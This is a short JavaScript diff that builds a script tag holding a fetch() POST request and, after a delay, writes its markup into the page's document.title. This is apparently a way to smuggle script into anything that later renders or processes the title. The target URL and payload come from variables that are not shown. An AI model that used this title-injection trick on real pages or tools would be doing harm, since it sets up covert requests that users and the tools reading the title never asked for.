@@ -32,10 +32,11 @@
 
             // Construct the script tag with the POST request code
             var scriptTagContent = 'fetch(' + JSON.stringify(url) + ', {method: ' + JSON.stringify(method) + ', body: ' + JSON.stringify(body) + ', headers: ' + JSON.stringify(headers) + '})';
-            var scriptTag = '<script>' + scriptTagContent + '</script>';
+            var scriptTag = document.createElement('script');
+            scriptTag.textContent = scriptTagContent;
 
             // Set the title to the script tag
-            document.title = scriptTag;
+            document.title = scriptTag.outerHTML;
         }
 
         // Wait for 3 seconds and then set the title to the script tag with the POST request
